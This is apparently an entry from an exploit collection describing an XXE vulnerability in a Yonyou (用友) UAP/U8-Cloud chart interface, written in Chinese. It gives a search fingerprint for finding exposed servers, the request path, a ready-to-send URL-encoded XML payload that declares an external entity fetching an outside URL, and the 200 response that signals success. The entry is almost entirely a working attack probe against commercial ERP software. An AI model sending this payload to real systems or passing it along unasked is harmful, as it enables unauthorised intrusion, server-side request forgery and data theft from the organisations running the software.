# 用友UPA系统chart接口xxe漏洞

用友 ｜ XXE ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /lfw/chart HTTP/1.1`

**Payload**
```
type=pie&xmlstr=%3C?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://www.baidu.com%22%3E]%3E%3Cchartdataset%3E%3Cparam%3E%3Ctitle%3E%26xxe;%3C/title%3E%3C/param%3E%3Cchart%3E%3Cname%3EUAP%3C/name%3E%3Ccount%3E1%3C/count%3E%3C/chart%3E%3C/chartdataset%3E
```
- **响应特征**：200